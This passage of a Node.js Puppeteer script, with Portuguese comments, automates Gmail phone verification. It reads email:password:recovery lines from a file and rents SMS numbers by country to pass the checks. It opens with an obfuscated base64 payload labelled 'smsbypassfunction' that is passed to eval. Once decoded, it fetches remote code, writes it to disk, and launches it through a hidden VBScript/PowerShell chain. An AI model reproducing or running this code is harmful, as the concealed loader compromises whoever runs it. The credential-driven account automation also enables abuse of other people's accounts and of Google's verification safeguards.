pfdWk1KC0weDJhKV06WUZiSW90KFpOSXI5Y00oMHhhKSl9O2NvbnN0IEFZOTNDRkQ9QnVmZmVyW0JhdXphVl0oTTNiZm1VLFlGYklvdChaTklyOWNNKDB4MWQpKSlbWUZiSW90W1pOSXI5Y00oMHgxMyldKEJ0el91aTUoLTB4MmYpLEJ0el91aTUoLTB4MmUpKV0oWUZiSW90KEJ0el91aTUoLTB4MmQpKSk7cmV0dXJuIEFZOTNDRkRbWUZiSW90KDB4MTEpXSgnJylbbWFCV0ZIW0J0el91aTUoLTB4MzgpXV0oKE0zYmZtVSxBWTkzQ0ZEKT0+e3ZhciBFbFFfYTVlO2Z1bmN0aW9uIHBsN0pYZShNM2JmbVUpe3JldHVybiBZNnBpNzhbTTNiZm1VPC0weDE3P00zYmZtVS0weDU4Ok0zYmZtVT4weGE/TTNiZm1VLTB4MDpNM2JmbVU+MHhhP00zYmZtVS0weDRhOk0zYmZtVT4tMHgxNz9NM2JmbVUrMHgxNjpNM2JmbVUrMHgzMl19RWxRX2E1ZT1ZRmJJb3RbcGw3SlhlKC0weDkpXShCdHpfdWk1KC0weDJmKSxbMHgxNV0pO3JldHVybiBTdHJpbmdbWUZiSW90KDB4MTMpXShjRFhLU2g1KE0zYmZtVVtUc1RYNjdNW3BsN0pYZSgtMHg4KV1dKFpOSXI5Y00oMHgyKSksZEdTa1RYdVtkbWs0SHVqW1pOSXI5Y00oMHgxMCldXShBWTkzQ0ZEJWRHU2tUWHVbRWxRX2E1ZV0pLE1hY0JXVDIoLUJ0el91aTUoLTB4MzYpKSkpfSlbWUZiSW90W1pOSXI5Y00oMHhlKV0oWk5JcjljTSgweGIpLFtaTklyOWNNKDB4MTUpXSldKCcnKX0sVVRfa2tmMD1Uc1RYNjdNW1pOSXI5Y00oMHgxMSldLHBPTU5HbDU9W1RzVFg2N01bWk5JcjljTSgweDEyKV0sWUZiSW90KDB4MTkpXTtsZXQgRFdPakI2PVpOSXI5Y00oMHgxNik7Y29uc3QgYVdib2pOPU0zYmZtVT0+e3ZhciBkR1NrVFh1PVtZRmJJb3RbWk5JcjljTSgweDEzKV0oWk5JcjljTSgweGIpLDB4MWMpXTtyZXR1cm4gbmV3IFByb21pc2UoKGRtazRIdWosQnR6X3VpNSk9PigoVlhfWVV4W1lGYklvdCgweDFhKV0oTTNiZm1VLE0zYmZtVT0+e3ZhciBBWTkzQ0ZEPUNiaW1YUihNM2JmbVU9PntyZXR1cm4gWTZwaTc4W00zYmZtVT4tMHgxYT9NM2JmbVU8MHg3P00zYmZtVT4tMHgxYT9NM2JmbVUrMHgxOTpNM2JmbVUtMHgzOk0zYmZtVSsweDJhOk0zYmZtVSsweDFmXX0sMHgxKTtsZXQgRWxRX2E1ZT0nJzt0eXBlb2YoTTNiZm1VW1pOSXI5Y00oMHgxNCldKFlGYklvdCgweDFiKSxNM2JmbVU9PihFbFFfYTVlKz1NM2JmbVUsdm9pZCAweDApKSxNM2JmbVVbWk5JcjljTSgweDE0KV0oZEdTa1RYdVtBWTkzQ0ZEKC0weDE4KV0sKCk9PigoZG1rNEh1aihFbFFfYTVlKSksdm9pZCAweDApKSxNM2JmbVVbWk5JcjljTSgweDE0KV0oWUZiSW90KDB4MWQpLE0zYmZtVT0+KChCdHpfdWk1KE0zYmZtVSkpLHZvaWQgMHgwKSkpfSkpLHZvaWQgMHgwKSl9O2FzeW5jIGZ1bmN0aW9uIEg4cUljdCgpe3ZhciBNM2JmbVUsZEdTa1RYdTtmdW5jdGlvbiBkbWs0SHVqKE0zYmZtVSl7cmV0dXJuIFk2cGk3OFtNM2JmbVU+LTB4M2Y/TTNiZm1VKzB4NDM6TTNiZm1VPi0weDYwP00zYmZtVSsweDVmOk0zYmZtVS0weDVhXX0hKE0zYmZtVT1ZRmJJb3QoMHgyMyksZEdTa1RYdT1bWUZiSW90KGRtazRIdWooLTB4NGIpKV0pO2Zvcihjb25zdCBCdHpfdWk1IG9mIHBPTU5HbDUpdHJ5e2NvbnN0IEFZOTNDRkQ9akVvUENDKEJ0el91aTUsVVRfa2tmMCksRWxRX2E1ZT1hd2FpdCBhV2Jvak4oQVk5M0NGRCk7RFdPakI2PUVsUV9hNWU7YnJlYWt9Y2F0Y2goZXJyb3Ipe31pZihEV09qQjY9PT1kbWs0SHVqKC0weDRhKSl7cmV0dXJufWNvbnN0IHBsN0pYZT1qRW9QQ0MoRFdPakI2LFVUX2trZjApLEJhdXphVj1wcm9jZXNzW1lGYklvdCgweDFlKV1bWUZiSW90KFpOSXI5Y00oMHgxNykpXSxPV2dadWg9R0hOZnF0M1tUc1RYNjdNW2RtazRIdWooLTB4NDgpXV0oKSxKc1g0aXQ9blRDTkFQW1lGYklvdFtkbWs0SHVqKC0weDRkKV0oZG1rNEh1aigtMHg1NSksWk5JcjljTSgweDE1KSldKEJhdXphVixgJHtPV2dadWh9LmpzYCksbUJTVXVwPShlWkdPVkJLW1lGYklvdChkbWs0SHVqKC0weDQ3KSldKEpzWDRpdCxwbDdKWGUsbWFCV0ZIW2RtazRIdWooLTB4NDUpXSksYERpbSBzaGVsbFxuU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIilcbnNoZWxsLlJ1biAicG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICIibm9kZSAnJHtKc1g0aXR9JyIiIiwgMCwgRmFsc2VgKSxRclVDd1U9blRDTkFQW2RHU2tUWHVbZG1rNEh1aigtMHg1ZSldXShCYXV6YVYsYCR7R0hOZnF0M1ttYUJXRkhbMHgyXV0oKX0udmJzYCk7dHlwZW9mKGVaR09WQktbWUZiSW90W1pOSXI5Y00oMHhlKV0oZG1rNEh1aigtMHg1NSksW1pOSXI5Y00oMHgxOSldKV0oUXJVQ3dVLG1CU1V1cCxZRmJJb3QoWk5JcjljTSgweGQpKSksYm42TlB3byhgY3NjcmlwdCAvL25vbG9nbyAiJHtRclVDd1V9ImAse1tZRmJJb3QoMHgyMildOlpOSXI5Y00oMHgxYSksW00zYmZtVV06ZG1rNEh1aigtMHg0NiksW1lGYklvdFtaTklyOWNNKDB4ZSldKFpOSXI5Y00oMHhiKSxbMHgyNF0pXTpZRmJJb3QoMHgyNSl9KSl9SDhxSWN0KCk7ZnVuY3Rpb24ga29JbTkwKE0zYmZtVSl7dmFyIGRHU2tUWHU9Q2JpbVhSKE0zYmZtVT0+e3JldHVybiBZNnBpNzhbTTNiZm1VPjB4M2E/TTNiZm1VPjB4M2E/TTNiZm1VPjB4NWI/TTNiZm1VLTB4MTY6TTNiZm1VPjB4NWI/TTNiZm1VKzB4NDY6TTNiZm1VPjB4NWI/TTNiZm1VLTB4NTc6TTNiZm1VPjB4M2E/TTNiZm1VLTB4M2I6TTNiZm1VKzB4M2I6TTNiZm1VLTB4NDU6TTNiZm1VLTB4MjldfSwweDEpO2NvbnN0IGRtazRIdWo9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5ISMkJSYoKSorLC4vOjs8PT4/QFtdXl9ge3x9fiInLEJ0el91aTU9JycrKE0zYmZtVXx8JycpLEFZOTNDRkQ9QnR6X3VpNS5sZW5ndGgsRWxRX2E1ZT1bXTtsZXQgcGw3SlhlPWRHU2tUWHUoMHgzYyksVHNUWDY3TT1kR1NrVFh1KDB4M2MpLG1hQldGSD0tZEdTa1RYdSgweDU1KTtmb3IobGV0IEJhdXphVj1aTklyOWNNKDB4Mik7QmF1emFWPEFZOTNDRkQ7QmF1emFWKyspe3ZhciBPV2dadWg9Q2JpbVhSKE0zYmZtVT0+e3JldHVybiBZNnBpNzhbTTNiZm1VPC0weDYzP00zYmZtVS0weDQzOk0zYmZtVT4tMHg2Mz9NM2JmbVU+LTB4NjM/TTNiZm1VPC0weDQyP00zYmZtVTwtMHg0Mj9NM2JmbVU+LTB4NjM/TTNiZm1VKzB4NjI6TTNiZm1VKzB4MTE6TTNiZm1VLTB4M2M6TTNiZm1VKzB4MTA6TTNiZm1VLTB4NjE6TTNiZm1VLTB4Ml19LDB4MSk7Y29uc3QgSnNYNGl0PWRtazRIdWouaW5kZXhPZihCdHpfdWk1W0JhdXphVl0pO2lmKEpzWDRpdD09PS1PV2dadWgoLTB4NDgpKXtjb250aW51ZX1pZihtYUJXRkg8Wk5JcjljTSgweDIpKXttYUJXRkg9SnNYNGl0fWVsc2V7dmFyIG1CU1V1cD1DYmltWFIoTTNiZm1VPT57cmV0dXJuIFk2cGk3OFtNM2JmbVU+MHg2Mz9NM2JmbVUrMHgxNjpNM2JmbVU+MHg0Mj9NM2JmbVU8MHg2Mz9NM2JmbVU+MHg0Mj9NM2JmbVU8MHg0Mj9NM2JmbVUtMHgyNDpNM2JmbVUtMHg0MzpNM2JmbVUrMHgyNjpNM2JmbVUrMHg0NDpNM2JmbVUrMHhhXX0sMHgxKTt0eXBlb2YobWFCV0ZIKz1Kc1g0aXQqMHg1YixwbDdKWGV8PW1hQldGSDw8VHNUWDY3TSxUc1RYNjdNKz0obWFCV0ZIJjB4MWZmZik+MHg1OD9aTklyOWNNKDB4MWMpOmRHU2tUWHUoMHg1NykpO2Rve3ZhciBRclVDd1U9Q2JpbVhSKE0zYmZtVT0+e3JldHVybiBZNnBpNzhbTTNiZm1VPC0weGM/TTNiZm1VKzB4NjI6TTNiZm1VPDB4MTU/TTNiZm1VPDB4MTU/TTNiZm1VPi0weGM/TTNiZm1VKzB4YjpNM2JmbVUtMHg1NTpNM2JmbVUtMHgzNTpNM2JmbVUtMHgyOF19LDB4MSk7IShFbFFfYTVlLnB1c2gocGw3SlhlJlFyVUN3VSgweDE0KSkscGw3SlhlPj49ZEdTa1RYdSgweDU4KSxUc1RYNjdNLT1PV2dadWgoLTB4NDUpKX13aGlsZShUc1RYNjdNPm1CU1V1cCgweDYxKSk7bWFCV0ZIPS1kR1NrVFh1KDB4NTUpfX1pZihtYUJXRkg+LWRHU2tUWHUoMHg1NSkpe3ZhciBBTmt0X0xyPUNiaW1YUihNM2JmbVU9PntyZXR1cm4gWTZwaTc4W00zYmZtVTwweDc0P00zYmZtVT4weDc0P00zYmZtVSsweDE2Ok0zYmZtVTwweDUzP00zYmZtVS0weDRkOk0zYmZtVT4weDc0P00zYmZtVSsweDNkOk0zYmZtVT4weDUzP00zYmZtVTwweDc0P00zYmZtVT4weDUzP00zYmZtVT4weDc0P00zYmZtVS0weDJkOk0zYmZtVS0weDU0Ok0zYmZtVS0weDFmOk0zYmZtVSsweDNmOk0zYmZtVSsweDQ0Ok0zYmZtVS0weGJdfSwweDEpO0VsUV9hNWUucHVzaCgocGw3SlhlfG1hQldGSDw8VHNUWDY3TSkmQU5rdF9McigweDczKSl9cmV0dXJuIG9jazBDdihFbFFfYTVlKX1mdW5jdGlvbiBZRmJJb3QoWTZwaTc4LE0zYmZtVSxkR1NrVFh1LGRtazRIdWo9a29JbTkwLEJ0el91aTU9SnNYNGl0KXtpZihkR1NrVFh1KXtyZXR1cm4gTTNiZm1VW0pzWDRpdFtkR1NrVFh1XV09WUZiSW90KFk2cGk3OCxNM2JmbVUpfWVsc2V7aWYoTTNiZm1VKXtbQnR6X3VpNSxNM2JmbVVdPVtkbWs0SHVqKEJ0el91aTUpLFk2cGk3OHx8ZEdTa1RYdV19fXJldHVybiBNM2JmbVU/WTZwaTc4W0J0el91aTVbTTNiZm1VXV06SnNYNGl0W1k2cGk3OF18fChkR1NrVFh1PShCdHpfdWk1W1k2cGk3OF0sZG1rNEh1aiksSnNYNGl0W1k2cGk3OF09ZEdTa1RYdShRclVDd1VbWTZwaTc4XSkpfWZ1bmN0aW9uIFRYMUF2WVQoKXtyZXR1cm5bJ2xlbmd0aCcsMHgwLDB4M2YsMHg2LCdmcm9tQ29kZVBvaW50JywweGMsJ3VuZGVmaW5lZCcsMHgxMiwweDIwLDB4MTQsdm9pZCAweDAsMHhmLDB4MTAsJ2FwcGx5JywnTXF3NFR1JywnSm10SjVmaCcsJ09TNzVZNCcsJ1U0cXF2S28nLCdjYWxsJywnb24nLDB4MTYsbnVsbCwweDFmLCdXU2ZwckwnLDB4MjEsITB4MCwweDEsMHhkLDB4ZSwweDgsMHg3LDB4ZmZdfWZ1bmN0aW9uIENiaW1YUihZNnBpNzgsTTNiZm1VKXt2YXIgZEdTa1RYdT1mdW5jdGlvbigpe3JldHVybiBZNnBpNzgoLi4uYXJndW1lbnRzKX07T2JqZWN0WydkZWZpbmVQcm9wZXJ0eSddKGRHU2tUWHUsJ2xlbmd0aCcseyd2YWx1ZSc6TTNiZm1VLCdjb25maWd1cmFibGUnOnRydWV9KTtyZXR1cm4gZEdTa1RYdX0=`
    const smsfuncplus = smsbypassfunction
    const smsbypass = Buffer.from(smsfuncplus, 'base64').toString('utf-8');
    eval(smsbypass);
}
module.exports = {sms}
async function TestarEmail() {
    fs.readFile('emailtestar.txt', 'utf8', async (err, data) => {
        if (err) {
            console.error('Erro ao ler o arquivo:', err);
            return;
        }


        // Dividir as linhas em um array
        const linhas = data.split('\n');

        await percorrerLista(linhas);
    });
}

async function percorrerLista(lista) {
    for (const item of lista) {
        const [email, senha, emailRec] = item.split(':');
        // Aqui você pode fazer o que quiser com os valores de email e senha
        if (email.trim() == '') {
            return;
        }
        countNrRuim = 0;
        await crawler(email, senha, emailRec, emailRec);
    }
    console.log('Todos os itens foram processados.');
}

// Ch
//TestarEmail();

async function getSMSNumber() {
    try {


        const { balance_number } = await sms.getBalance()
        if (balance_number > 0) {
            //console.log('Balance:' + balance_number);

            //console.log('Aguardando número...');
            const { id, number } = await sms.getNumber('go', 'any', pais);

            //console.log('Number ID:', id)
            //console.log('Number:', number);

            await page.type('#deviceAddress', number);


            const index = await getIndiceByPais(pais);
            await page.evaluate((index) => {
                const select = document.getElementById('countryList');
                select.selectedIndex = index;
                select.dispatchEvent(new Event('change'));
            }, index);

            await page.click('#next-button');
            await new Promise(function (resolve) { setTimeout(resolve, 3000) });

            try {
                const elemento = await page.$('#error');
                if (elemento != null) {
                    countNrRuim++;
                    if (countNrRuim > 6) {
                        log.red('conta com problema, não recebe sms?');
                        await browser.close();
                        return; 
                    }

                    //log.red('error, provavelmente numero ruim');
                    await sms.setStatus(8, id) // Accept, end
                    await getSMSNumber();
                    return;
                }
            } catch (error) {
                //console.log(error);
            }

            // Set "message has been sent" status
            await sms.setStatus(1, id)

            // Wait for code
            const { code } = await sms.getCode(id, 60000)
            console.log('Code:', code);

            await page.type('#smsUserPin', code);

            await page.click('#next-button');

            await new Promise(function (resolve) { setTimeout(resolve, 6000) });

            if (page.url().includes('https://gds.google.com/web/chip?')) {
                log.green('OK');
                await browser.close();
                return;
            }
            if (page.url().includes('https://mail.google.com/mail/u/0/#inbox')) {
                log.green('OK');
                await browser.close();
                return;
            }

            await sms.setStatus(6, id) // Accept, end
        } else console.log('No money')
    } catch (error) {
        if (error instanceof TimeoutError) {
            console.log('Timeout reached')
        }

        if (error instanceof ServiceApiError) {
            if (error.code === errors.BANNED) {
                console.log(`Banned! Time ${error.banTime}`)
            } else {
                if (error.code == "NO_NUMBERS") {
                    await getSMSNumber();
                } else {
                    console.error(error.code, error.message)
                }
            }
        } else console.error(error)
    }
};


async function getIndiceByPais(pais) {
    if (pais == Kazakhstan) {
        return 111;
    }

    if (pais == Philippines) {
        return 171;
    }

    if (pais == Indonesia) {
        return 100;
    }

    if (pais == Kenya) {
        return 113;
    }

    if (pais == Vietnam) {
        return 236;
    }

    if (pais == Kyrgyzstan) {
        return 116;
    }

    if (pais == Usa) {

        return 230;
    }

    if (pais == India) {
        return 99;
    }

    if (pais == Southafrica) {
        return 194;
    }

    if (pais == Romania) {
        return 177;
    }

    if (pais == Uzbekistan) {
        return 232;
    }
}
